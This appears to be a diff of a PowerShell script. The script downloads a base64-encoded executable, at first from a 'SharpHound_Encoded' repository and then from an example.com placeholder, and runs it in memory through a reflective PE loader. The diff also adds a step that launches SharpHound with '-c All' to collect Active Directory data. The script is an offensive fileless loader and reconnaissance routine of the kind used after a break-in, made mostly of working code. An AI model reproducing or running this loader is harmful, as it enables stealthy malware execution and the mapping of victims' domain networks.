@@ -1,5 +1,5 @@
 # Define the URL containing the base64 encoded string
-$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"
+$url = "http://example.com/base64encodedexe"
 
 # Download the base64 encoded string from the URL
 $base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
@@ -55,3 +55,9 @@ public class PELoader
 
 # Invoke the reflective PE loader function with the decoded executable bytes
 Invoke-ReflectivePE -PEBytes $exeBytes
+
+# Example usage of SharpHound with arguments
+$sharpHoundPath = "SharpHound.exe"
+$arguments = "-c All"
+
+Start-Process -FilePath $sharpHoundPath -ArgumentList $arguments
